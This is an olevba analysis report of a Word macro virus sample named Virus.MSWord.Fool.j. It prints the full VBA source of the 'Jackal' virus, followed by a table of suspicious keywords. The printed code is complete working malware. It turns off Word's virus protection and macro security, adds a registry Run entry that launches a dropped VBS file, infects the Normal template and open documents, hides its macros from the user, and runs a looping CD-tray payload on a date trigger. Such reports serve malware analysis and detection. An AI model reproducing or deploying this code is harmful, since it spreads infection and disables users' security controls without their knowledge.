olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jackal.bas 
in file: Virus.MSWord.Fool.j - OLE stream: 'Macros/VBA/Jackal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' Jackal v1.00 by WalruS 08/00
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub AutoClose()
    On Error Resume Next
        With Options
            .VirusProtection = False
            .ConfirmConversions = False
            .SaveNormalPrompt = False
        End With
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WalruS"
    If NormalTemplate.VBProject.VBComponents.Item("Jackal").Name <> "Jackal" Then
    ActiveDocument.VBProject.VBComponents("Jackal").Export ("C:\Windows\Jackal.drv")
    SetAttr "C:\Windows\Jackal.drv", 6
    End If
    Call DropJackal
    Call InfectDocument
    If Month(Now) = Day(Now) Then Call PayLoad
    NormalTemplate.Saved = True
End Sub

Sub DropJackal()
    On Error Resume Next
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Jackal") = "C:\Windows\System\Jackal.vbs"
     Open "C:\Windows\System\Jackal.vbs" For Output As #1
         Print #1, "On Error Resume Next"
         Print #1, "' Jackal.vbs by WalruS"
         Print #1, "Set WordObj = CreateObject(""Word.Application"")"
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(""Jackal"")"
         Print #1, "WordObj.NormalTemplate.save"
         Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (""C:\Windows\Jackal.drv"")"
         Print #1, "WordObj.NormalTemplate.save"
         Print #1, "WordObj.Quit"
    Close #1
End Sub

Sub InfectDocument()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Jackal").Name <> "Jackal" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\Jackal.drv")
    ActiveDocument.Save
    End If
End Sub

Sub PayLoad()
    On Error Resume Next
    StatusBar = "    Hello there id like you to meet the Jackal virus !!!"
    Application.Caption = "Jackal"
    Application.Username = "The WalruS"
    Do
    mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
    Loop
End Sub

' Designed to be Stealthy    ;-)

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub FileTemplates()
End Sub

Sub ToolsMacro()
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
End Sub

Sub ViewVBCode()
    Call Stealth
    ShowVisualBasicEditor = True
End Sub

Sub Stealth()
    On Error Resume Next
    ' Removes Macros from Normal Template and Active Document
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub

Sub HelpAbout()
    On Error Resume Next
    MsgBox "The Jackal Word Virus by WalruS", 0, "The Jackal"
    Call PayLoad
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |Jackal.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

